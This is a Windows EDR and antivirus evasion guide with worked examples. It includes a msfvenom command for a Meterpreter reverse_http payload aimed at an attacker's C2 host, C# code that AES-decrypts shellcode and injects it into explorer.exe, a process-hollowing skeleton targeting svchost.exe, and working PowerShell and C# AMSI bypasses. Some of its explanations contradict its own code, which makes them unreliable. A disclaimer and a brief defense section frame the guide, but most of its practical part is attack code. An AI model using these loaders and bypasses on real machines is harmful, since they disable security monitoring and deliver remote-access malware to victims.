# EDR & Antivirus Evasion Guide

A comprehensive guide to understanding and bypassing Endpoint Detection and Response (EDR) and Antivirus (AV) solutions on Windows environments.

## Table of Contents
1.  [Introduction to EDR/AV](#introduction-to-edrav)
2.  [Signature-Based Detection](#signature-based-detection)
3.  [Heuristic and Behavioral Analysis](#heuristic-and-behavioral-analysis)
4.  [Static Analysis Evasion](#static-analysis-evasion)
    *   [Polymorphic Code](#polymorphic-code)
    *   [Metamorphic Code](#metamorphic-code)
    *   [Packing and Obfuscation](#packing-and-obfuscation)
5.  [Dynamic Analysis Evasion (Sandboxing)](#dynamic-analysis-evasion-sandboxing)
    *   [Environment Checks](#environment-checks)
    *   [Sleep and Time-Based Evasion](#sleep-and-time-based-evasion)
6.  [In-Memory Evasion Techniques](#in-memory-evasion-techniques)
    *   [Reflective DLL Injection](#reflective-dll-injection)
    *   [Process Hollowing](#process-hollowing)
    *   [AMSI Bypass](#amsi-bypass)
7.  [Living Off The Land (LOLBAS)](#living-off-the-land-lolbas)
8.  [Kernel-Level Bypasses](#kernel-level-bypasses)
    *   [Direct Kernel Object Manipulation](#direct-kernel-object-manipulation)
9.  [Tools and Frameworks](#tools-and-frameworks)
10. [Countermeasures and Defense](#countermeasures-and-defense)
11. [Disclaimer](#disclaimer)

---

### Introduction to EDR/AV
Endpoint Detection and Response (EDR) and Antivirus (AV) solutions are critical components of modern cybersecurity defenses. Traditional AVs primarily rely on signature-based detection, while EDRs incorporate more advanced techniques like behavioral analysis, machine learning, and real-time monitoring to detect and respond to threats. This guide explores techniques used by security professionals to test the efficacy of these solutions.

### Signature-Based Detection
This is the most basic form of detection. AV software maintains a database of known malware signatures (hashes). Any file matching a signature in the database is flagged as malicious.
*   **Evasion:** Simple modifications to the malware's source code, such as changing variable names, adding junk code, or re-compiling, can alter the file's hash and evade basic signature detection.

### Heuristic and Behavioral Analysis
Heuristic analysis looks for suspicious characteristics in code without an exact signature match. Behavioral analysis, common in EDRs, monitors the execution of a program for malicious behavior patterns (e.g., modifying registry keys, injecting into other processes, unusual network connections).
*   **Evasion:** Slowly executing malicious actions, using legitimate system functions for malicious purposes, and ensuring the malware's behavior closely mimics that of a benign application.

### Static Analysis Evasion
Static analysis involves examining code without executing it.

#### Polymorphic Code
Polymorphic code uses an encryption engine to encrypt the malicious payload and a decryption stub. Each time the malware is propagated, the encryption key changes, making the encrypted payload (and its signature) different.
*   **Example Tool:** Veil Framework

#### Metamorphic Code
Metamorphism goes a step further by completely rewriting the malware's code with each new infection. The new code has the same functionality but a different structure, making it much harder to detect with signatures.

#### Packing and Obfuscation
Packers (e.g., UPX) compress or encrypt the executable. Obfuscators make the code unreadable to humans and difficult for static analysis engines to parse. This hides strings, API calls, and the true intent of the code.
*   **Example Tool:** ConfuserEx (.NET), various custom packers.

### Dynamic Analysis Evasion (Sandboxing)
Sandboxes are isolated environments where suspicious files can be safely executed and analyzed.
*   **Evasion:** Malware can perform checks to determine if it's running in a sandbox.

#### Environment Checks
*   **Checking for Virtualization:** Look for artifacts of virtual machines (e.g., specific MAC addresses, registry keys, or files related to VMware or VirtualBox).
*   **Checking System Resources:** Check for low CPU counts, small RAM size, or small disk size, which are common in sandbox environments.
*   **User Activity:** Check for mouse movements, running processes, or recent documents.

#### Sleep and Time-Based Evasion
Many sandboxes run for a limited time. The malware can simply "sleep" for a long period (e.g., 10-20 minutes) before executing its payload, hoping the analysis window will expire.

### In-Memory Evasion Techniques
These techniques focus on executing malicious code directly in memory to avoid leaving traces on disk.

#### Reflective DLL Injection
A technique where a library is loaded into a process's memory without being registered in the process's module list. This makes the malicious code harder to find.

#### Process Hollowing
A legitimate process is created in a suspended state. Its memory is then unmapped and replaced with malicious code. The process is then resumed, making it appear as if a legitimate process is running.

#### AMSI Bypass
The Antimalware Scan Interface (AMSI) is a Windows feature that allows applications and services to integrate with any antivirus product. It's heavily used by PowerShell and other scripting languages. Bypassing AMSI is crucial for running malicious scripts in memory.
*   **Method:** Patching the `AmsiScanBuffer()` function in memory to neutralize it.

### Living Off The Land (LOLBAS)
This involves using legitimate, pre-existing tools on a system to perform malicious activities. Since these are trusted system binaries, their actions are less likely to be flagged as malicious.
*   **Examples:** `PowerShell.exe`, `certutil.exe`, `wmic.exe`, `bitsadmin.exe`.

### Kernel-Level Bypasses
These are the most advanced techniques and often involve exploiting vulnerabilities to run code in the kernel.
*   **Direct Kernel Object Manipulation:** Modifying kernel structures directly to unhook EDR sensors from key system APIs. This effectively blinds the EDR.
*   **Bring Your Own Vulnerable Driver (BYOVD):** An attacker with admin privileges can load a legitimate but vulnerable driver to exploit it and gain kernel-level code execution.

### Tools and Frameworks
*   **Metasploit Framework:** Provides various encoders and payloads to help evade AV.
*   **Veil Framework:** A tool designed to generate AV-evading payloads.
*   **SharpShooter:** Payload generation framework.
*   **Cobalt Strike:** A commercial threat emulation platform with many built-in evasion features.

### Countermeasures and Defense
*   **Layered Defense:** Use a combination of AV, EDR, application whitelisting, and firewalls.
*   **Behavioral Monitoring:** Focus on detecting malicious *behavior* rather than just malicious *files*.
*   **Threat Hunting:** Proactively search for signs of compromise within the network.
*   **User Training:** Educate users about phishing and other social engineering tactics.

### Disclaimer
This guide is for educational and authorized security testing purposes ONLY. Using these techniques for unauthorized activities is illegal and unethical. Always obtain explicit, written permission before conducting any security testing.

---

## Practical Example: Shellcode Injection with AES Encryption

This tutorial, inspired by a post from [San3ncrypt3d](https://san3ncrypt3d.com/2022/03/24/AESInj/), demonstrates a basic implementation of a shellcode runner that decrypts an AES-encrypted payload and injects it into a target process. While the injection technique itself is well-known to security products, this example focuses on the implementation of AES encryption as a method of evading static analysis.

### Step 1: Generate Shellcode with Msfvenom

First, we need to generate the shellcode we want to execute on the target machine. We can use Metasploit's `msfvenom` for this. The following command generates a 64-bit reverse HTTP payload in C# format.

```bash
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=<YOUR_IP> LPORT=443 -f csharp
```
Replace `<YOUR_IP>` with the listening address for your command and control (C2) server. This command will output a byte array containing the shellcode.

### Step 2: Encrypt the Shellcode

Next, we need to encrypt the generated shellcode using AES. The key principle is to use a strong encryption algorithm to conceal the malicious payload from static signature-based scanning. You would typically create a small utility program to do this.

**Conceptual C# Code for Encryption:**
```csharp
using System.Security.Cryptography;
using System.IO;

public byte[] EncryptShellcode(byte[] shellcode, byte[] key, byte[] iv)
{
    using (Aes aesAlg = Aes.Create())
    {
        aesAlg.Key = key;
        aesAlg.IV = iv;

        ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

        using (MemoryStream msEncrypt = new MemoryStream())
        {
            using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
            {
                csEncrypt.Write(shellcode, 0, shellcode.Length);
            }
            return msEncrypt.ToArray();
        }
    }
}
```
**Important:** The `key` and `IV` (Initialization Vector) used for encryption must be stored securely and embedded within the final injector program so it can decrypt the payload at runtime.

### Step 3: Create the Injector Program

The final step is to create the C# program that will carry the encrypted shellcode, decrypt it in memory, and inject it into a host process. This program is often called a "loader" or "runner."

The injector performs the following actions:
1.  Stores the encrypted shellcode in a byte array.
2.  Contains the AES key and IV for decryption.
3.  Uses a decryption function to restore the original shellcode in memory.
4.  Leverages Windows API calls to inject and execute the shellcode.

**Key Windows APIs for Injection:**
*   `VirtualAllocEx`: Allocates memory within a remote process.
*   `WriteProcessMemory`: Writes the decrypted shellcode into the allocated memory.
*   `CreateRemoteThread`: Creates a new thread in the remote process to execute the shellcode.

**Conceptual C# Code for Decryption and Injection:**
```csharp
// Assume 'buf' is the byte array with your encrypted shellcode
// Assume 'key' and 'iv' are the same ones used for encryption

// 1. Decrypt the shellcode
byte[] decryptedShellcode = AESDecrypt(buf, key, iv);

// 2. Find a target process (e.g., explorer.exe)
Process targetProcess = Process.GetProcessesByName("explorer")[0];
IntPtr processHandle = OpenProcess(0x1F0FFF, false, targetProcess.Id);

// 3. Allocate memory in the target process
IntPtr remoteMemAddr = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)decryptedShellcode.Length, 0x3000, 0x40);

// 4. Write the shellcode to the allocated memory
WriteProcessMemory(processHandle, remoteMemAddr, decryptedShellcode, (uint)decryptedShellcode.Length, out _);

// 5. Create a remote thread to execute it
CreateRemoteThread(processHandle, IntPtr.Zero, 0, remoteMemAddr, IntPtr.Zero, 0, IntPtr.Zero);
```
This is a simplified representation. A full implementation requires P/Invoke signatures for the Win32 API calls.

### Conclusion and Further Evasion

As noted in the original article, this technique on its own is not fully undetectable. AV and EDR solutions are adept at monitoring calls to sensitive APIs like `WriteProcessMemory` and `CreateRemoteThread`. To enhance evasion, one could:
*   Use alternative injection techniques (e.g., APC injection, thread hijacking).
*   Obfuscate the injector code itself.
*   Implement sandbox detection and anti-debugging checks.

The primary value of this method is in bypassing static file scanning by ensuring the malicious payload is never written to disk in its decrypted form.

---
*Reference: [Shell Code Injector with AES Encryption - EDR Bypass](https://san3ncrypt3d.com/2022/03/24/AESInj/)*

---

## Practical Example: Process Hollowing

Process Hollowing is a classic process injection technique where a legitimate process is created in a suspended state, and its memory is replaced with malicious code. When the process is resumed, it executes the injected code instead of its original code. This helps evade detection because the malicious code runs under the guise of a trusted process.

### Steps for Process Hollowing

1.  **Create a target process in a suspended state:** Use `CreateProcess` with the `CREATE_SUSPENDED` flag. A common target is a legitimate Windows process like `svchost.exe` or `explorer.exe`.
2.  **Hollow out the memory:** Unmap the original executable's memory from the process's address space using `NtUnmapViewOfSection` or `ZwUnmapViewOfSection`.
3.  **Allocate new memory:** Allocate a new region of memory in the target process large enough to hold the malicious payload, using `VirtualAllocEx`.
4.  **Write the payload:** Write the malicious shellcode or executable into the newly allocated memory space using `WriteProcessMemory`.
5.  **Redirect execution:** Update the main thread's context to point its instruction pointer (RIP or EIP) to the starting address of the injected payload. This is done using `GetThreadContext` and `SetThreadContext`.
6.  **Resume the process:** Call `ResumeThread` to let the process execute the malicious code.

### Conceptual C# Code

```csharp
// (P/Invoke signatures for Win32 APIs are required)

// Malicious payload (e.g., from msfvenom)
byte[] payload = new byte[/* ... */];

// Path to a legitimate executable to use as a host
string legitimateApp = "C:\\Windows\\System32\\svchost.exe";

// 1. Create the host process in a suspended state
var startupInfo = new STARTUPINFO();
var processInfo = new PROCESS_INFORMATION();
CreateProcess(legitimateApp, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 /* CREATE_SUSPENDED */, IntPtr.Zero, null, ref startupInfo, out processInfo);

// 2. Carve out the memory space of the legitimate process
// This often involves using NtUnmapViewOfSection from ntdll.dll
// (This is an advanced step and requires resolving the function from the DLL)

// 3. Allocate memory for the payload in the host process
IntPtr remoteMemAddr = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero, (uint)payload.Length, 0x3000 /* MEM_COMMIT | MEM_RESERVE */, 0x40 /* PAGE_EXECUTE_READWRITE */);

// 4. Write the payload into the allocated memory
WriteProcessMemory(processInfo.hProcess, remoteMemAddr, payload, (uint)payload.Length, out _);

// 5. Get thread context, update entry point, and set context
// (This involves getting the thread context, modifying the Eax/Rax register to point to remoteMemAddr, and setting the context back)

// 6. Resume the thread to execute the payload
ResumeThread(processInfo.hThread);
```
**Note:** This is a simplified overview. Real-world implementations must handle different processor architectures (x86 vs. x64) and deal with locating the base address of the executable in memory.

---

## Practical Example: Bypassing AMSI in PowerShell

The Antimalware Scan Interface (AMSI) is a generic interface standard that allows applications and services to integrate with any antimalware product present on a machine. PowerShell, VBScript, and .NET assemblies are common users of AMSI. Bypassing it is often a prerequisite for running malicious scripts entirely in memory.

A very common bypass involves patching the `AmsiScanBuffer` function in memory. The goal is to make the function return a "clean" result (`AMSI_RESULT_CLEAN`) before it even has a chance to scan the malicious script.

### PowerShell One-Liner Bypass

This famous one-liner patches the function in the current PowerShell process's memory. It uses reflection to find the `amsi.dll` module and modify the function bytes.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
**How it works:** This command finds the `AmsiUtils` class within the PowerShell automation DLL, locates the private static field `amsiInitFailed`, and sets its value to `true`. This tricks PowerShell into thinking that the AMSI initialization has failed, so it stops sending any further code to the antimalware engine for scanning.

### C# AMSI Bypass

The same principle can be applied from a C# program. This is useful for loaders that execute .NET assemblies in memory. The code loads `amsi.dll`, finds the address of the `AmsiScanBuffer` function, and overwrites its first few bytes with instructions that will make it exit prematurely and return a success code.

```csharp
// (P/Invoke signatures for LoadLibrary, GetProcAddress, and VirtualProtect are required)

// 1. Get a handle to amsi.dll
IntPtr libraryHandle = LoadLibrary("amsi.dll");
if (libraryHandle == IntPtr.Zero) return;

// 2. Get the address of the AmsiScanBuffer function
IntPtr functionAddress = GetProcAddress(libraryHandle, "AmsiScanBuffer");
if (functionAddress == IntPtr.Zero) return;

// 3. The patch bytes for x64. These instructions effectively do:
//    mov eax, AMSI_RESULT_CLEAN (which is 0, but patching to return S_OK is more common)
//    ret
byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

// 4. Change memory permissions to allow writing to the function's memory space
VirtualProtect(functionAddress, (UIntPtr)patch.Length, 0x40 /* PAGE_EXECUTE_READWRITE */, out uint oldProtect);

// 5. Apply the patch by copying the bytes
Marshal.Copy(patch, 0, functionAddress, patch.Length);

// 6. Restore the original memory permissions
VirtualProtect(functionAddress, (UIntPtr)patch.Length, oldProtect, out _);
```
After this patch is applied in the process's memory, any subsequent calls to AMSI from that process will be ineffective, allowing malicious scripts or assemblies to run without being scanned. 